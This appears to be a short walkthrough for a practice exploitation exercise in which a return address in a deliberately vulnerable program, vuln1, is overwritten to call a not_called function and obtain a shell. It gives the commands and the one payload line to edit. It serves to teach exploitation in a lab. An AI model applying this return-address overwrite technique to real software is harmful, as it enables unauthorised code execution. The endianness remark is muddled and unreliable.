This example is the easiest one. Idea is to overwrite return address using our payload.

Firstly, run the ./vuln1 to see the address that we are planning to overwrite.

./vuln1

This will print the address of not_called function. We want to call this function which will break the control flow of program.

Then vim, or emacs, payload1.py to update with this address.

vim payload1.py

You should update this line:
payload+=struct.pack("I",0x0002dd24)

0x0002dd24-> this is the address of not_called for my case. Update this with yours. Do not forget that printed address will be little endian, payload is big endian.

Once payload is updated, you should write it into payload.txt by typing:
./payload1.py > payload1.txt

As last step, we are gonna use our payload:

cat payload1.txt | ./vuln1

hopefully you will see "Enjoy your shell"


